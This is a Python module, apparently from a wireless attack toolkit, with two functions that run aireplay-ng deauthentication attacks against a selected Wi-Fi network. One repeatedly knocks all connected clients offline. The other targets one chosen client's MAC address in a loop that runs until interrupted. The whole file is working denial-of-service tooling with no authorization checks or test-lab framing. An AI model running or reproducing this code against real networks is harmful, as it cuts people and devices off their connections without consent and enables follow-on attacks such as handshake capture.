"""Deauthentication attack service functions."""

from __future__ import annotations

import subprocess
import time

from rich import box
from rich.prompt import Prompt
from rich.table import Table

from app.ui import BORDER_STYLE
from attacks.commands import aireplay_deauth


def run_deauth_all_clients(app) -> None:
    """Deauthenticate all clients connected to the selected network."""
    if not app.selected_network:
        app.console.print("[bold red]Please select a target network first![/]")
        return

    network = app.networks[app.selected_network]
    clients = network["clients"]
    if not clients:
        app.console.print("[bold yellow]No clients connected to this network.[/]")
        return

    app.console.print(f"[bold yellow]Starting deauthentication attack on all clients of {network['ssid']}...[/]")
    app.console.print("[warning]This attack continues until you press Ctrl+C to stop it.[/]")
    start_time = time.time()
    round_count = 0

    try:
        while True:
            round_count += 1
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            duration = f"{minutes:02d}:{seconds:02d}"
            app.console.print(f"\n[bold yellow]--- Round {round_count} | Duration: {duration} ---[/]")
            app.console.print(f"[bold cyan]Broadcasting deauth to all clients on {network['ssid']}...[/]")
            subprocess.run(
                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30,
            )
            app.console.print(f"[bold green]Targeting individual clients ({len(clients)}):[/]")
            for i, client in enumerate(clients, 1):
                subprocess.run(
                    aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=client),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                app.console.print(f"  [green]{i}/{len(clients)}[/] - Deauthing client: [cyan]{client}[/]")
                time.sleep(0.1)
            app.console.print(f"[bold yellow]Round {round_count} complete - {len(clients)} clients deauthenticated[/]")
            app.console.print("[bold red]Press Ctrl+C to stop the attack[/]")
            time.sleep(1.5)
    except KeyboardInterrupt:
        app.console.print("\n[bold green]Deauthentication attack stopped by user![/]")
        app.logger.info(f"Deauthentication attack stopped after {round_count} rounds")
    except Exception as exc:
        app.console.print(f"\n[bold red]Error during deauthentication: {str(exc)}[/]")
        app.logger.error(f"Error during deauthentication: {str(exc)}")


def run_deauth_single_client(app) -> None:
    """Deauthenticate a specific client connected to the selected network."""
    if not app.selected_network:
        app.console.print("[bold red]Please select a target network first![/]")
        return

    network = app.networks[app.selected_network]
    clients = network["clients"]
    if not clients:
        app.console.print("[bold yellow]No clients connected to this network.[/]")
        return

    app.console.print(f"\n[bold yellow]Clients connected to {network['ssid']}:[/]")
    client_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
    client_table.add_column("ID", style="cyan", justify="center")
    client_table.add_column("MAC Address", style="green")
    for idx, client in enumerate(clients, 1):
        client_table.add_row(str(idx), client)
    app.console.print(client_table)

    choice = Prompt.ask(
        "Select client ID to deauthenticate (0 to cancel)",
        choices=["0"] + [str(i) for i in range(1, len(clients) + 1)],
    )
    if choice == "0":
        return
    selected_client = list(clients)[int(choice) - 1]
    start_time = time.time()
    packet_count = 0

    app.console.print(f"\n[bold yellow]Starting targeted deauthentication attack against client: {selected_client}[/]")
    app.console.print("[warning]This attack continues until you press Ctrl+C to stop it.[/]")
    try:
        while True:
            packet_count += 2
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            duration = f"{minutes:02d}:{seconds:02d}"
            subprocess.run(
                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=selected_client),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30,
            )
            if packet_count < 10:
                status = "[yellow]Starting attack[/]"
            elif packet_count < 50:
                status = "[green]Attack in progress[/]"
            else:
                status = "[bold green]Attack effective[/]"
            app.console.print(
                f"\r[cyan]Client: {selected_client}[/] | [green]Network: {network['ssid']}[/] | {status} | "
                f"[blue]Packets: {packet_count}[/] | [red]Duration: {duration}[/] [bold red](Ctrl+C to stop)[/]",
                end="",
            )
            time.sleep(1.0)
    except KeyboardInterrupt:
        app.console.print("\n\n[bold green]Targeted deauthentication attack stopped by user![/]")
        app.logger.info(f"Targeted deauthentication attack against {selected_client} stopped after {packet_count} packets")
    except Exception as exc:
        app.console.print(f"\n\n[bold red]Error during deauthentication: {str(exc)}[/]")
        app.logger.error(f"Error during deauthentication: {str(exc)}")
